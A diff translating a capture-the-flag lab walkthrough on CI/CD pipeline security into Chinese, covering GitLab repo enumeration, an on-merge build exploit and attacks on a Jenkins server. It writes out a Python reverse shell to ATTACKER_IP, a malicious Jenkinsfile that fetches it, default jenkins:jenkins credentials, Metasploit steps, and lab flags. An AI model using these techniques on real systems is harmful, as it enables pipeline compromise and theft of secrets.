+正如在《管道自动化和源代码安全》房间的简介中提到的，保护管道和构建的第一步是保护源代码。 如果威胁行为者能够破坏我们的构建源，他们就有能力破坏构建本身。 我们希望保护我们的源代码免受以下两个主要问题的影响：
 
-- **Unauthorised Tampering** - This is the simplest issue of the two. Only authorised users should be able to make changes to the source code. This means that we want to control who has the ability to push new code to our repo.
-- **Unauthorised Disclosure** - This is a bit more tricky. Depending on the application, the source code itself might be considered sensitive. For example, Microsoft would not like to disclose the source code of Word since that is their intellectual property. In cases where the source code is sensitive, we must ensure we do not intentionally disclose it. This issue is a lot more common to find.
+- **未经授权的篡改** - 这是两个问题中最简单的一个。 只有授权用户才能对源代码进行更改。 这意味着我们希望控制谁有能力向我们的代码仓库推送新代码。
+- **未经授权的泄露** - 这个问题稍微复杂一些。 根据应用程序的不同，源代码本身可能被视为敏感信息。 例如，微软不希望公开 Word 的源代码，因为那是他们的知识产权。 在源代码敏感的情况下，我们必须确保不会有意泄露它。 这个问题在实践中更为常见。
 
-### Confusion of responsibilities
+### 职责混淆
 
-Let's take a look at exploiting an insecure build source. A common mistake made in large organisations is believing that the perimeter is a sufficient security boundary. Although the perimeter plays a role, it should not be seen as the only boundary. Granular access control on the internal network should be implemented as well. This false belief can lead to interesting misconfigurations. Let's take a look at a practical example.
+让我们来看看如何利用不安全的构建源。 大型组织中常见的错误是认为边界是足够的安全边界。 虽然边界确实起到一定作用，但它不应被视为唯一的边界。 内部网络上的细粒度访问控制也应该实施。 这种错误的信念可能导致有趣的配置错误。 让我们来看一个实际的例子。
 
-Some organisations are incredibly large and have multiple teams and business units responsible for different things. If we take an organisation such as a bank, many different teams and units work together to run the bank. Furthermore, in large organisations like this, it isn't as simple as just saying that we have an "IT" business unit, as there may be several teams working on many different IT and development projects within the bank, using a wide range of coding languages, CI/CD pipelines, and build frameworks. Such large organisations may choose to host their source code internally since much of that development may be intellectual property (IP). While we would hope that access to the various source code repos would be managed granularly, mistakes do creep in.
+有些组织规模非常大，拥有多个团队和业务部门负责不同的事务。 如果我们以银行为例，许多不同的团队和部门共同协作来运营银行。 此外，在这样的大型组织中，情况并不像简单地说我们有一个"IT"业务部门那样简单，因为银行内部可能有多个团队在从事许多不同的 IT 和开发项目，使用各种编程语言、CI/CD 管道和构建框架。 这样的大型组织可能会选择在内部托管他们的源代码，因为许多开发内容可能是知识产权（IP）。 虽然我们希望各种源代码仓库的访问能够进行细粒度管理，但错误确实会悄悄出现。
 
-One such mistake is that organisations can leave registration for their Gitlab instance open. Not open to the internet (although this has also happened before), but open to any user on their internal network to register a profile. This was simulated in the previous task by allowing you to register your own Gitlab profile.
+其中一个错误是组织可能让他们的 Gitlab 实例保持开放注册。 不是对互联网开放（尽管这种情况以前也发生过），而是对内部网络上的任何用户开放注册个人资料。 这在前一个任务中通过允许您注册自己的 Gitlab 个人资料进行了模拟。
 
-Some would consider this not to be a direct risk, but let's look at how the attack surface grows. Our example bank organisation might have 10,000 employees, of which 2000 may be working as developers and need access to Gitlab. In essence, our attack surface has grown by 500%! If a single employee of our bank is compromised, an attacker would have the ability to register a profile and exfiltrate any publicly shared repos.
+有些人可能认为这不是直接风险，但让我们看看攻击面是如何扩大的。 我们的示例银行组织可能有 10,000 名员工，其中 2000 人可能是开发人员，需要访问 Gitlab。 本质上，我们的攻击面增长了 500%！ 如果我们银行的任何一名员工被攻陷，攻击者将能够注册个人资料并外泄任何公开共享的仓库。
 
-This is the second misconfiguration that comes into play. Developers of our bank may believe that because the Gitlab instance is only accessible internally, it is okay to configure repos to be shared publicly. This means that any user who has a valid Gitlab account will be able to view the repo. While they may perhaps not be able to alter the code, remember, in this example, the code itself is seen as the IP of the bank. This confusion between who is responsible for securing the source code can lead to sensitive information being disclosed to the threat actor. Let's take a look at how this can be exploited!
+这是第二个起作用的配置错误。 我们银行的开发人员可能认为，由于 Gitlab 实例只能在内部访问，因此将仓库配置为公开共享是可以的。 这意味着任何拥有有效 Gitlab 账户的用户都将能够查看该仓库。 虽然他们可能无法修改代码，但请记住，在这个例子中，代码本身被视为银行的知识产权。 这种关于谁负责保护源代码的混淆可能导致敏感信息泄露给威胁行为者。 让我们来看看如何利用这一点！
 
-### Exploiting a vulnerable build source
+### 利用易受攻击的构建源
 
-You have already registered a profile on the GitLab instance. While you can use manual enumeration to find sensitive information in repos, where you are on a red team, you will need to automate this process to ensure stealth and efficiency. We will not be teaching both in this task for obvious reasons, so let's look at how we can make the process efficient. To efficiently enumerate publicly visible repos, we will make use of the Gitlab API and a Python script as follows:
+您已经在 GitLab 实例上注册了个人资料。 虽然您可以使用手动枚举在仓库中查找敏感信息，但在红队行动中，您需要自动化此过程以确保隐秘性和效率。 出于显而易见的原因，我们不会在本任务中教授这两种方法，所以让我们看看如何使过程更高效。 为了高效枚举公开可见的仓库，我们将使用 Gitlab API 和一个 Python 脚本，如下所示：
 
 ```python title="enumerator.py"
 import gitlab
@@ -468,29 +468,29 @@ for project in projects:
         pass
 ```
 
-**Note**: Make sure to install the Gitlab pip package using `pip3 install python-gitlab==3.15.0`.
+**注意**：请确保使用 `pip3 install python-gitlab==3.15.0` 安装 Gitlab pip 包。
 
-As mentioned before, the script provided is not stealthy. Rather than first determining which repos are publicly available, it recovers the entire list of all repos and attempts to download each of them. This shows an example of how a threat actor can quickly and easily recover all publicly available repos. Feel free to play around with the script to introduce stealth.
+如前所述，提供的脚本并不隐秘。 它不是首先确定哪些仓库是公开可用的，而是恢复所有仓库的完整列表并尝试下载每个仓库。 这展示了威胁行为者如何快速轻松地恢复所有公开可用的仓库。 请随意修改脚本以引入隐秘性。
 
-As you will see, line 5 of the script requires a Gitlab authentication token. Gitlab does not allow for its API to be interfaced with using credentials, as this is deemed insecure. Therefore, to use the script, we will first have to generate an API token for our account. Authenticate to the Gitlab server and perform the following steps:
+正如您将看到的，脚本的第 5 行需要一个 Gitlab 认证令牌。 Gitlab 不允许使用凭据与其 API 交互，因为这被认为是不安全的。 因此，要使用该脚本，我们首先必须为我们的账户生成一个 API 令牌。 认证到 Gitlab 服务器并执行以下步骤：
 
-1. Click on your profile icon and select Preferences:
+1. 点击您的个人资料图标并选择偏好设置：
 
-   ![preferences menu](img/image_20251126-102651.png)
+   ![偏好设置菜单](img/image_20251126-102651.png)
 
-2. Click on Access Tokens:
+2. 点击访问令牌：
 
-   ![access tokens menu](img/image_20251127-102722.png)
+   ![访问令牌菜单](img/image_20251127-102722.png)
 
-3. Enter a name for a new API token and select the api, read_api, and read_repository scopes:
+3. 输入新 API 令牌的名称，并选择 api、read_api 和 read_repository 范围：
 
-   ![api initiation and scope selection](img/image_20251127-102755.png)
+   ![API 初始化和范围选择](img/image_20251127-102755.png)
 
-4. Click Create personal access token, reveal, and copy your access token to a safe location:
+4. 点击创建个人访问令牌，显示并复制您的访问令牌到安全位置：
 
-   ![create personal access token](img/image_20251128-102821.png)
+   ![创建个人访问令牌](img/image_20251128-102821.png)
 
-5. Add the token to the script and execute it to download all repos:
+5. 将令牌添加到脚本中并执行它以下载所有仓库：
 
    ```shell title="Terminal"
    [thm]$ python3.9 enumerator.py 
@@ -500,33 +500,33 @@ As you will see, line 5 of the script requires a Gitlab authentication token. Gi
    836fe1fa-0fc2-4917-b1c1-61badef3b711
    ```
 
-Now you have successfully downloaded all of the publicly available repos! At this point, there are several ways you can look for sensitive information. The easiest would be to extract all repos and run a grep for specific keywords, such as `secret`. Make sure to read through the available repos to find the hidden secret flag! Note: don't change the name of the script (enumerator.py) as it will throw errors!
+现在您已成功下载所有公开可用的仓库！ 此时，有几种方法可以查找敏感信息。 最简单的方法是提取所有仓库并对特定关键词（如 `secret`）运行 grep 命令。 请务必阅读可用的仓库以找到隐藏的秘密标志！ 注意：不要更改脚本的名称（enumerator.py），否则会抛出错误！
 
-### Securing the Build Source
+### 保护构建源
 
-Granular access control is crucial to managing repositories and the GitLab platform. It involves defining specific permissions and restrictions for different users or groups, ensuring that only authorised individuals have the appropriate level of access to sensitive resources. This helps maintain security, confidentiality, and effective collaboration within a development environment.
+细粒度访问控制对于管理仓库和 GitLab 平台至关重要。 它涉及为不同的用户或组定义特定的权限和限制，确保只有授权个人对敏感资源具有适当级别的访问权限。 这有助于在开发环境中维护安全性、保密性和有效协作。
 
-In GitLab, group-based access control is a powerful mechanism that simplifies permissions management across multiple repositories and projects. Here's how it works:
+在 GitLab 中，基于组的访问控制是一种强大的机制，可以简化跨多个仓库和项目的权限管理。 以下是它的工作原理：
 
-1. **Group-Based Access Control**: GitLab allows you to organise projects into groups. Instead of managing access for each project separately, you can set permissions at the group level. This means that the same access rules apply to all projects within the group, making it easier to maintain consistent security policies. For example, you can create a group for the development team and define permissions, such as who can view, edit, or contribute to projects within that group. This approach streamlines access management and reduces the chances of errors or oversights when configuring permissions for individual repositories.
-2. **Access Levels** : GitLab offers different access levels, such as Guest, Reporter, Developer, Maintainer, and Owner. Each level comes with specific capabilities and permissions. Assigning the appropriate access level to each user or group ensures they have the necessary privileges without granting unnecessary permissions.
-3. **Sensitive Information Protection** : One critical consideration is preventing the accidental exposure of sensitive information. GitLab provides features to help with this:
-   1. **GitLab's .gitignore** : This file specifies which files or directories should be excluded from version control. It's crucial for preventing sensitive data like passwords, API keys, and configuration files from being committed to repositories.
-   2. **Environment Variables** : GitLab allows you to define and manage environment variables securely, separate from the source code. This is especially useful for storing sensitive data needed during the CI/CD process without exposing it in the repository.
-   3. **Branch Protection** : Branches, like master or main, can be protected to prevent direct pushes, ensuring that changes go through code review and automated testing before merging.
+1. **基于组的访问控制**：GitLab 允许您将项目组织到组中。 与其单独管理每个项目的访问权限，您可以在组级别设置权限。 这意味着相同的访问规则适用于组内的所有项目，使得维护一致的安全策略更加容易。 例如，您可以为开发团队创建一个组并定义权限，例如谁可以查看、编辑或贡献该组内的项目。 这种方法简化了访问管理，并减少了在配置单个仓库权限时出现错误或疏忽的机会。
+2. **访问级别**：GitLab 提供不同的访问级别，例如访客、报告者、开发者、维护者和所有者。 每个层级都带有特定的能力和权限。 为每个用户或群组分配合适的访问级别，可确保他们拥有必要的权限，而不会授予不必要的权限。
+3. **敏感信息保护**：一个关键考虑因素是防止敏感信息意外泄露。 GitLab 提供了以下功能来帮助实现这一点：
+   1. **GitLab 的 .gitignore**：此文件指定哪些文件或目录应从版本控制中排除。 这对于防止密码、API 密钥和配置文件等敏感数据被提交到代码库至关重要。
+   2. **环境变量**：GitLab 允许您安全地定义和管理环境变量，与源代码分离。 这对于存储 CI/CD 过程中所需的敏感数据特别有用，而不会在代码库中暴露。
+   3. **分支保护**：可以保护分支（如 master 或 main），以防止直接推送，确保更改在合并前经过代码审查和自动化测试。
 
-Remember, maintaining the security of both the repositories and the GitLab instance itself requires constant vigilance and best practices:
+请记住，维护代码库和 GitLab 实例本身的安全性需要持续警惕和最佳实践：
 
-- Review and update access permissions regularly as team members change roles or leave the organisation.
-- Implement two-factor authentication (2FA) to add an extra layer of security to user accounts.
-- Monitor audit logs to track who has accessed or modified repositories and projects.
-- Regularly scan repositories for sensitive information using tools designed for this purpose.
+- 随着团队成员角色变更或离开组织，定期审查和更新访问权限。
+- 实施双因素认证（2FA），为用户账户增加额外的安全层。
+- 监控审计日志，跟踪谁访问或修改了代码库和项目。
+- 使用专为此目的设计的工具定期扫描代码库中的敏感信息。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Which file specifies which directories and files should be excluded for version control? </summary>
+<summary>哪个文件指定哪些目录和文件应从版本控制中排除？ </summary>
 
 ```plaintext
 .gitignore
@@ -536,7 +536,7 @@ Remember, maintaining the security of both the repositories and the GitLab insta
 
 <details>
 
-<summary> What can you protect to ensure direct pushes and vulnerable code changes are avoided? </summary>
+<summary>您可以保护什么以确保避免直接推送和易受攻击的代码更改？ </summary>
 
 ```plaintext
 Branches
@@ -546,7 +546,7 @@ Branches
 
 <details>
 
-<summary> What issue does lack of access control and unauthorised code changes lead to? </summary>
+<summary>缺乏访问控制和未经授权的代码更改会导致什么问题？ </summary>
 
 ```plaintext
 unauthorised tampering
@@ -556,7 +556,7 @@ unauthorised tampering
 
 <details>
 
-<summary> What is the API key stored within the Mobile application that can be accessed by any Gitlab user? </summary>
+<summary>存储在移动应用程序中且任何 Gitlab 用户都可以访问的 API 密钥是什么？ </summary>
 
 ```plaintext
 THM{You.Found.The.API.Key}
@@ -566,70 +566,70 @@ THM{You.Found.The.API.Key}
 
 :::
 
-## Task 6 Securing the Build Process
+## 任务 6 保护构建过程
 
-Now that we have paid attention to protecting the build source of our pipeline, next on our journey is ensuring that the build process itself does not have misconfigurations that can lead to compromise.
+既然我们已经注意保护管道的构建源，接下来我们的任务是确保构建过程本身没有可能导致安全漏洞的错误配置。
 
-### Managing Dependencies
+### 管理依赖项
 
-The first step to securing the build process is to secure the dependencies of the build. As our pipeline kicks off, it will start by compiling our source code into the final build. However, our source code may depend on external libraries and SDKs for its functionality. Thus, during this compilation process, the build pipeline will gather these dependencies to perform the build. There are two main concerns for our build process when it comes to dependencies:
+保护构建过程的第一步是保护构建的依赖项。 当我们的管道启动时，它将开始将源代码编译成最终构建。 然而，我们的源代码可能依赖外部库和 SDK 来实现其功能。 因此，在此编译过程中，构建管道将收集这些依赖项以执行构建。 在依赖项方面，我们的构建过程有两个主要关注点：
 
-- Supply Chain Attacks - If a threat actor can take over one of these dependencies, they would be able to inject malicious code into the build
-- Dependency Confusion - If an internally developed dependency is used, an attacker could attempt a dependency confusion attack to inject code into the build process itself.
+- 供应链攻击 - 如果威胁行为者能够接管其中一个依赖项，他们将能够将恶意代码注入构建中
+- 依赖混淆 - 如果使用内部开发的依赖项，攻击者可能尝试依赖混淆攻击，将代码注入构建过程本身。
 
-Both of these attacks have already been covered in the [Dependency Management room](http://tryhackme.com/jr/dependencymanagement) if you want to learn more and practically exploit these attacks. In this task, we will focus on a misconfiguration within the build process itself.
+如果您想了解更多并实际利用这些攻击，这两种攻击已在 [依赖管理房间](http://tryhackme.com/jr/dependencymanagement) 中介绍。 在此任务中，我们将重点关注构建过程本身的一个错误配置。
 
-### Knowing When to Start the Build
+### 了解何时开始构建
 
-A big issue with pipelines and the build process is that, in a nutshell, whether you like to hear it or not, it is remote code execution as a feature. Once a pipeline kicks off, the build server communicates to one of the build agents to perform the build, which includes reading the commands that have to be executed from the CI file and performing them. While this creates automation, it also creates the risk that if an attacker can alter what is being built or when, they might be able to leverage this code execution to compromise systems. Therefore, we need to pay special attention to the following:
+管道和构建过程的一个大问题是，简而言之，无论您是否愿意听到，它都是作为功能的远程代码执行。 一旦管道启动，构建服务器会与其中一个构建代理通信以执行构建，包括从 CI 文件读取必须执行的命令并执行它们。 虽然这创造了自动化，但也带来了风险，即如果攻击者能够改变正在构建的内容或时间，他们可能能够利用此代码执行来危害系统。 因此，我们需要特别注意以下几点：
 
-- What actions do we allow to kick off the build process?
-- Who has permission to perform these actions to kick off the build process?
-- Where will the build process occur?
+- 我们允许哪些操作启动构建过程？
+- 谁有权执行这些操作以启动构建过程？
+- 构建过程将在哪里进行？
 
-The answers to these questions can help you determine the attack surface of your pipeline. While, in most cases, a bad answer to one of these questions won't compromise either the build or the pipeline, there are some toxic combinations that you must be aware of. Let's take a bit of a closer look at these three questions.
+这些问题的答案可以帮助您确定管道的攻击面。 虽然在大多数情况下，对其中一个问题的错误回答不会危及构建或管道，但您必须注意一些有毒组合。 让我们更仔细地看看这三个问题。
 
-#### What actions start the build process
+#### 哪些操作启动构建过程
 
-We have the ability to decide what actions can start the build process. Normally, by default, a commit of new code to the source will start the pipeline. But we do have the ability to provide a much more granular configuration. For example, we can decide that only commits to specific branches, such as main, should start the pipeline. This configuration means that we can, with a lot more peace of mind, allow developers to make direct commits to other branches. As long as we limit who has the ability to either directly commit to the main branch or approve merge requests for it, we can limit the attack surface of our pipeline.
+我们能够决定哪些操作可以启动构建过程。 通常，默认情况下，将新代码提交到源将启动管道。 但我们确实能够提供更细粒度的配置。 例如，我们可以决定只有提交到特定分支（如 main）才应启动管道。 这种配置意味着我们可以更安心地允许开发人员直接提交到其他分支。 只要我们限制谁有能力直接提交到主分支或批准其合并请求，我们就可以限制管道的攻击面。
 
-However, this might run us into the issue where those merge requests break in the pipeline, causing us to perform multiple merges just to fix the issue, which can be tedious. Therefore, there may be a use case to have the build process already start on other branches or when new merge requests are made to indicate whether the merge request would break our pipeline. If we choose to go down this path, we must understand that our attack surface has grown since multiple actions could start the build process. Nothing to worry about just yet, but we must ensure that these actions cannot be performed simply by anyone!
+然而，这可能会让我们遇到合并请求在管道中中断的问题，导致我们执行多次合并只是为了修复问题，这可能很繁琐。 因此，可能有一个用例，即构建过程已经在其他分支上启动，或者当新的合并请求被提出时，以指示合并请求是否会破坏我们的管道。 如果我们选择走这条路，我们必须理解我们的攻击面已经增长，因为多个操作可以启动构建过程。 现在还不用担心，但我们必须确保这些操作不能由任何人随意执行！
 
-#### Who can start the build process
+#### 谁可以启动构建过程
 
-Once we decide which actions can start the build process, we need to narrow down who can perform these actions. As mentioned before, the pipeline only executes when code is merged to the main branch; this can be a very small list of users who have the ability to approve these merges. The question becomes more complicated if we allow builds to kick off from other actions. Based on the actions (and branches) that can start the build, we will have to ask who can start it and add them to the list, thereby growing the attack surface. For example, if we allow builds to start on merge requests themselves, we have to ensure that the attacker cannot make a merge request or that the merge build will occur in a segregated environment.
+一旦我们决定哪些操作可以启动构建过程，我们需要缩小谁可以执行这些操作的范围。 如前所述，管道仅在代码合并到主分支时执行；这可能是一个非常小的用户列表，他们有能力批准这些合并。 如果我们允许构建从其他操作启动，问题就变得更复杂。 基于可以启动构建的操作（和分支），我们将不得不问谁可以启动它并将他们添加到列表中，从而增加攻击面。 例如，如果我们允许构建在合并请求本身上启动，我们必须确保攻击者不能提出合并请求，或者合并构建将在隔离环境中进行。
 
-#### Where will the build occur
+#### 构建将在哪里进行
 
-Lastly, we need to decide where the build will occur. We don't have to simply rely on a single build agent to perform all of our builds. In the above example, if we want developers to run builds on other branches, we can just simply register a new build agent that will run a build in a different environment than the build agent of the main branch. Based on our answers to the previous two questions, we may need to ensure we secure where the build will execute. If we allow multiple actions to start the build, we probably want to ensure that the same build agent is not used for all of these actions, as they have different degrees of sensitivity.
+最后，我们需要决定构建将在哪里进行。 我们不必仅仅依赖单个构建代理来执行所有构建。 在上面的例子中，如果我们希望开发人员在其他分支上运行构建，我们可以简单地注册一个新的构建代理，该代理将在与主分支的构建代理不同的环境中运行构建。 基于我们对前两个问题的答案，我们可能需要确保构建执行的位置是安全的。 如果我们允许多个操作启动构建，我们可能希望确保相同的构建代理不用于所有这些操作，因为它们具有不同的敏感度。
 
-Now that we understand the three questions we must answer, let's explore a very interesting but common toxic combination!
+既然我们理解了必须回答的三个问题，让我们探索一个非常有趣但常见的有毒组合！
 
-### Exploiting a Merge Build
+### 利用合并构建
 
-A common toxic combination is called On-Merge builds. Let's take a look at the README left in Ash Android's repo ([http://gitlab.tryhackme.loc/ash/Merge-Test](http://gitlab.tryhackme.loc/ash/Merge-Test)):
+一个常见的有毒组合称为 On-Merge 构建。 让我们看看 Ash Android 代码库中留下的 README（[http://gitlab.tryhackme.loc/ash/Merge-Test](http://gitlab.tryhackme.loc/ash/Merge-Test)）：
 
-![README file](img/image_20251141-104148.png)
+![README 文件](img/image_20251141-104148.png)
 
-It seems like Ash is getting tired of users making merge requests to his code, only for it to break his pipelines! To combat this, he has enabled on-merge builds. This means that a build will be executed to test the merge code as soon as a merge request is made. This is a very common configuration. Certain CI/CD software, such as Jenkins, enables this by default! The issue, however, is that this could lead to a compromise. Let's see how to leverage this to compromise a build agent and some secrets!
+看起来 Ash 对用户向他的代码提出合并请求感到厌倦，结果却破坏了他的管道！ 为了解决这个问题，他启用了 on-merge 构建。 这意味着一旦提出合并请求，将执行构建以测试合并代码。 这是一个非常常见的配置。 某些CI/CD软件（如Jenkins）默认启用此功能！ 然而问题在于，这可能导致系统被入侵。 让我们看看如何利用这一点来入侵构建代理并获取一些机密信息！
 
-Reviewing the source code, we see that Ash uses a Jenkinsfile. This is a CI/CD script that will be executed by Jenkins through a webhook. Effectively, when certain actions are performed, such as a merge request is opened, or code is pushed to a branch, Gitlab will notify Jenkins of the change through a webhook. Jenkins would then pull the source code and execute the steps listed in the Jenkinsfile before providing feedback to Gitlab on the outcome of the build.
+查看源代码，我们发现Ash使用了Jenkinsfile。 这是一个CI/CD脚本，Jenkins将通过webhook执行它。 实际上，当执行某些操作时，例如打开合并请求或将代码推送到分支，Gitlab将通过webhook通知Jenkins变更。 然后Jenkins将拉取源代码并执行Jenkinsfile中列出的步骤，然后向Gitlab提供构建结果的反馈。
 
-However, this is also what creates the issue. If a merge request is going to be built and any user can modify both the source code and the CI/CD Jenkinsfile, it means that users can cause the build agent to build malicious code. To perform this process, we will first need to fork Ash's repo. Navigate to the repo and press the Fork option:
+然而，这也正是问题的根源。 如果要构建合并请求，并且任何用户都可以修改源代码和CI/CD Jenkinsfile，这意味着用户可以导致构建代理构建恶意代码。 要执行此过程，我们首先需要分叉Ash的代码库。 导航到代码库并点击Fork选项：
 
 ![img](img/image_20251142-104208.png)
 
-Forking will create a copy of the project. Select your namespace, mark the project as Private, and select Fork project:
+分叉将创建项目的副本。 选择您的命名空间，将项目标记为私有，然后选择Fork项目：
 
 ![fork project button](img/image_20251142-104223.png)
 
-While there are multiple ways in which the merge build can be exploited, we will focus on the simplest method, which is to alter the Jenkinsfile. CI/CD pipelines are often just code execution as a feature, and we can leverage this by updating the Jenkinsfile to simply execute a shell for us! There are many ways to do this; if you feel comfortable, you can play around alone. We will follow a slower approach to ensure we get feedback from the Jenkins server as the build executes. To do this, we will first create a simple reverse shell file:
+虽然有多种方式可以利用合并构建，但我们将专注于最简单的方法，即修改Jenkinsfile。 CI/CD流水线通常只是将代码执行作为一项功能，我们可以通过更新Jenkinsfile来简单地为我们执行shell来利用这一点！ 有很多方法可以做到这一点；如果您感觉熟练，可以自己尝试。 我们将采用较慢的方法，以确保在构建执行时从Jenkins服务器获得反馈。 为此，我们将首先创建一个简单的反向shell文件：
 
 ```bash title="shell.sh"
 /usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-Make sure to modify ATTACKER_IP to be your VPN or AttackBox IP. You can now host this file with a simple Python webserver using `python3 -m http.server 8080` and we can create a listener using `nc -lvp 8081`. Click on the Jenkinsfile, then Edit, and replace your Jenkinsfile with the following code:
+确保将ATTACKER_IP修改为您的VPN或AttackBox IP。 您现在可以使用`python3 -m http.server 8080`通过简单的Python网络服务器托管此文件，并使用`nc -lvp 8081`创建监听器。 点击Jenkinsfile，然后点击编辑，并用以下代码替换您的Jenkinsfile：
 
 ```plaintext title="Jenkinsfile"
 pipeline {
@@ -646,11 +646,11 @@ pipeline {
     }
 ```
 
-Once you have made the edit, commit the changes. To have Jenkins execute our now malicious Jenkinsfile, we need to create a merge request:
+完成编辑后，提交更改。 要让Jenkins执行我们现在的恶意Jenkinsfile，我们需要创建一个合并请求：
 
 ![merge request](img/image_20251144-104402.png)
 
-Create the merge request, add a description, and click Create. If you completed all the steps in a couple of seconds, you should see a call be made to your web server to download the shell and, shortly after, a new shell connection on the terminal!
+创建合并请求，添加描述，然后点击创建。 如果您在几秒钟内完成了所有步骤，您应该会看到向您的网络服务器发出调用以下载shell，并在不久后在终端上看到新的shell连接！
 
 ```shell title="Terminal"
 root@AttackBox:~$ nc -lvp 8081
@@ -661,26 +661,26 @@ $ whoami
 ubuntu
 ```
 
-**Note: If you made a mistake somewhere in the process, you will have to submit a new merge request in order to get your shell. However, it has to be a completely brand new merge request in order for the webhook to trigger. As such, the easiest option is to completely remove your forked-repo and start again. To do this, navigate to your forked-repo, then go to Settings -> Advanced -> Delete Project. Once deleted, you can fork the repo again and start over.**
+**注意：如果您在过程中的某个地方出错，您将必须提交新的合并请求才能获得shell。 然而，必须是一个全新的合并请求才能触发webhook。 因此，最简单的选择是完全删除您的分叉代码库并重新开始。 为此，导航到您的分叉代码库，然后转到设置 -> 高级 -> 删除项目。 删除后，您可以再次分叉代码库并重新开始。**
 
-Protecting the build process
+保护构建过程
 
-Protecting the build process is key to ensuring vulnerabilities are avoided at the start of the code lifecycle. An insecure build can enable living-off-the-land attacks, supply chain attacks and a lot of trouble that is difficult to detect later in the pipeline. Here are some best practices to follow, which knit together what has been discussed in the previous tasks:
+保护构建过程是确保在代码生命周期开始时避免漏洞的关键。 不安全的构建可能启用无文件攻击、供应链攻击以及许多在流水线后期难以检测的麻烦。 以下是一些最佳实践，它们综合了之前任务中讨论的内容：
 
-1. **Isolation and Containerisation**: Run builds in isolated containers to prevent interference and maintain consistency.
-2. **Least Privilege**: Grant minimal permissions to CI/CD tools, restricting unnecessary access to sensitive resources.
-3. **Secret Management**: Use CI/CD tools' secret management features to store and inject sensitive data securely.
-4. **Immutable Artifacts**: Store build artifacts in a secure registry to prevent tampering and enable easy auditing.
-5. **Dependency Scanning**: Integrate dependency scanning to identify and address vulnerabilities in third-party libraries.
-6. **Pipeline as Code**: Define CI/CD pipelines as code, version-controlled alongside the source code.
-7. **Regular Updates**: Keep CI/CD tools and dependencies up to date to address known vulnerabilities.
-8. **Logging and Monitoring**: Monitor build logs for unusual activities and integrate them with security monitoring systems.
+1. **隔离与容器化**：在隔离的容器中运行构建，以防止干扰并保持一致性。
+2. **最小权限**：授予CI/CD工具最小权限，限制对敏感资源的不必要访问。
+3. **机密管理**：使用CI/CD工具的机密管理功能安全地存储和注入敏感数据。
+4. **不可变制品**：将构建制品存储在安全的注册表中，以防止篡改并便于审计。
+5. **依赖扫描**：集成依赖扫描以识别和解决第三方库中的漏洞。
+6. **流水线即代码**：将CI/CD流水线定义为代码，与源代码一起进行版本控制。
+7. **定期更新**：保持CI/CD工具和依赖项最新，以解决已知漏洞。
+8. **日志记录与监控**：监控构建日志以发现异常活动，并将其与安全监控系统集成。
 
-:::info Answer the questions below
+:::info 回答以下问题
 
 <details>
 
-<summary> Where should you store artefacts to prevent tampering? </summary>
+<summary> 您应该在哪里存储制品以防止篡改？ </summary>
 
 ```plaintext
 secure registry
@@ -690,7 +690,7 @@ secure registry
 
 <details>
 
-<summary> What mechanism should you always use to store and inject sensitive data? </summary>
+<summary> 您应该始终使用什么机制来存储和注入敏感数据？ </summary>
 
 ```plaintext
 secret management
@@ -700,7 +700,7 @@ secret management
 
 <details>
 
-<summary> What attack can malicious actors perform to inject malicious code in the build process? </summary>
+<summary> 恶意行为者可以执行什么攻击来在构建过程中注入恶意代码？ </summary>
 
 ```plaintext
 dependency confusion
@@ -710,7 +710,7 @@ dependency confusion
 
 <details>
 
-<summary> Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? </summary>
+<summary> 向Mother认证并按照流程获取Flag 1。 Flag 1是什么？ </summary>
 
 ```plaintext
 THM{7753f7e9-6543-4914-90ad-7153609831c3}
@@ -720,27 +720,27 @@ THM{7753f7e9-6543-4914-90ad-7153609831c3}
 
 :::
 
-## Task 7 Securing the Build Server
+## 任务7 保护构建服务器
 
-Our build process has now been protected. The next point of attack is the build server itself! If an attacker can gain access or control of our build server, this places them in quite a privileged position to compromise both the pipeline and the build.
+我们的构建过程现在已受到保护。 下一个攻击点是构建服务器本身！ 如果攻击者能够获得访问或控制我们的构建服务器，这将使他们处于相当有利的位置来破坏流水线和构建。
 
-### Build Server Basics
+### 构建服务器基础
 
-Before diving into the attack, let's discuss basic build server security. The simplest point to start is with access. Even in modern times, a common attack against build infrastructure is to guess credentials and gain access. Whenever you see a Jenkins server out in the wild, you would be surprised how many times `jenkins:jenkins` would do the trick!
+在深入攻击之前，让我们讨论基本的构建服务器安全。 最简单的起点是访问控制。 即使在现代，对构建基础设施的常见攻击也是猜测凭据并获得访问权限。 每当您在野外看到Jenkins服务器时，您会惊讶于`jenkins:jenkins`多少次都能成功！
 
-To secure our build server, we want to restrict access to it. You would often find that multiple members have access to the same build server. In these cases, we need to apply granular access to ensure that a compromise of one user would not lead to the compromise of all builds. Furthermore, we want to restrict the likelihood of a user being compromised by using multi-factor authentication.
+为了保护我们的构建服务器，我们希望限制对它的访问。 您经常会发现多个成员可以访问同一个构建服务器。 在这些情况下，我们需要应用细粒度的访问控制，以确保一个用户的入侵不会导致所有构建的入侵。 此外，我们希望通过使用多因素认证来限制用户被入侵的可能性。
 
-### Exposed Build Server
+### 暴露的构建服务器
 
-Let's take a look at the Jenkins build server in the network at [http://jenkins.tryhackme.loc:8080/](http://jenkins.tryhackme.loc:8080/). You may have to first make another update to your `/etc/hosts` file with the IP of the machine shown in your network diagram. You should see the following screen:
+让我们看一下网络中位于[http://jenkins.tryhackme.loc:8080/](http://jenkins.tryhackme.loc:8080/)的Jenkins构建服务器。 您可能需要首先使用网络图中显示的机器IP再次更新您的`/etc/hosts`文件。 您应该看到以下屏幕：
 
 ![Jenkins login screen](img/image_20251106-110635.png)
 
-Let's try our luck with `jenkins:jenkins` and we should be authenticated!
+让我们试试`jenkins:jenkins`，我们应该会被认证！
 
 ![authentication successful screen](img/image_20251106-110650.png)
 
-In this task, we will take a look at using some of the MSF modules to attack the Jenkins build server. On the AttackBox or your Kali VM, start Metasploit in the terminal using `msfconsole`. We will make use of the jenkins_script_console module from MSF:
+在此任务中，我们将看看使用一些MSF模块来攻击Jenkins构建服务器。 在AttackBox或您的Kali VM上，使用`msfconsole`在终端中启动Metasploit。 我们将使用MSF中的jenkins_script_console模块：
 
 ```shell title="Terminal"
 msf6 > use exploit/multi/http/jenkins_script_console
@@ -788,7 +788,7 @@ Exploit target:
